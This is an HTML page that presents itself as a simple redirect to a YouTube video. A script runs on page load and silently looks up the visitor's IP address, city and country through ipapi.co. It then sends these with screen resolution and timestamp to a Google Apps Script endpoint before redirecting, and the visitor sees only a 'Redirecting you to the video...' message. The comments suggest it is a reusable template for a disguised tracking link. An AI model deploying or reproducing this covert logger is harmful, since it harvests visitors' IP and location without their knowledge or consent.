<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
  <script>
    async function sendData() {
      const resolution = window.screen.width + "x" + window.screen.height;
      const time = new Date().toISOString();

      const location = await fetch("https://ipapi.co/json/")
        .then(res => res.json())
        .catch(() => ({}));

      const data = {
        resolution: resolution,
        time: time,
        city: location.city || "Unknown",
        country: location.country_name || "Unknown",
        ip: location.ip || "N/A"
      };

      fetch("https://script.google.com/macros/s/AKfycbxp0NKz6vGrF68zFhTe9jA1p1knWN4lW9hmfj3_p45EDU3LI-4UgyOFnsS8uTFm7NtC/exec", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
    }

    async function main() {
      await sendData();
      setTimeout(() => {
        window.location.href = "https://youtu.be/9KVG_X_7Naw?si=9t72tOriBhR-anLY"; // your video
      }, 1500); // wait 1.5 seconds to ensure data is sent
    }

    main();
  </script>
</head>
<body>
  <p>Redirecting you to the video...</p>
</body>
</html>
